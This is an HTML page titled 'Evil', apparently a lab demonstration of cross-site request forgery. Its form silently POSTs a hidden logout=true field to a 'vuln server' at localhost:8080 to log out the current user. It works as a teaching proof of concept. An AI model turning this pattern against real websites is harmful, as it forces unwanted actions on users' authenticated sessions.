<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
  <title>Evil</title>
  <style>
    * {
      --light-bgcolor: #fff2f2;
      --div-bgcolor: #ead8d8; 
      --active-bgcolor: #f3e9e9;
      --accent-color: #ff4242;
      --border-color: #cdbdbd;
      font-family: monospace;
      font-size: 98%;
    }
    html, body {
      margin: 0;
      background-color: var(--light-bgcolor);
    }
    div {
      padding: 25px;
      margin: 50px auto 20px;
      width: 320px;
      border: 1px solid var(--border-color);
      border-radius: 10px;
      background-color: var(--div-bgcolor);
    }
    input {
      border: 1px solid var(--border-color);
      border-radius: 10px;
      padding: 1px 7px 1px;
      background-color: var(--light-bgcolor);
    }
    input.text {
      width: 220px;
      height: 25px;
      margin-bottom: 10px;
      outline: none;
    }
    input.button, button {
      min-width: 80px;
      height: 30px;
      color: var(--accent-color);
    }
    input.button:active {
      background-color: var(--active-bgcolor);
    }
  </style>
</head>
<body>
  <div id="message-div">
    <h3 style="color: var(--accent-color);">Evil</h3>
    <p>Following form logs out currently logged in user from vuln server.</p>
    <form method="POST" action="http://localhost:8080/">
      <input class="text" id="logout" name="logout" type="hidden" value="true"/>
      <input class="button" id="logout" type="submit" value="Logout CSRF"/>
    </form>
  </div>
</body>
</html>
